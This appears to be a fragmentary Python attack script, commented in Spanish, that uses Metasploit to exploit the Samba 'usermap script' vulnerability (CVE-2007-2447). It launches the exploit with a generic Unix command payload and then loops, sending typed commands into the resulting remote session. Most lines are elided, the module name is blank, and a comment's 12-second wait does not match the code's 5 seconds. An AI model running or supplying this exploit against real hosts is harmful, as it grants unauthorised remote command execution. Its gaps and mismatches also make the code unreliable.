...
#Este script explota la vulnerabilidad "Samba usermap script" (CVE-2007-2447), obteniendo el acceso a la máquina con
...
if __name__ == '__main__':
    try:
        #Solicitamos al usuario que introduzca los datos que necesitamos, guardándolos en las variables pertinentes
        ...
        #Indicamos el módulo  que vamos a utilizar. Será de tipo exploit, y su nombre es ''. La variable "exploit" será de tipo Exploit, clase de MSF qque representa
        #un módulo de exploit. Es decir, toda la información del módulo se cargará en la variable "exploit". 
        ...
        #Lanzamos el exploit utilizando uno de los payloads que ofrece
        exploit.execute(payload='cmd/unix/generic')
        #Damos un margen de 12 segundos para que la sesión se active correctamente.
        time.sleep(5)
        ...
        if sesiones_activas:
            ...
            while not ejecuta_exit:
                ...
                if comando.lower()=="exit":
                    ...
                    #Escribimos en la sesión el comando ingresado, y luugo leemos la respuesta y la imprimimos. 
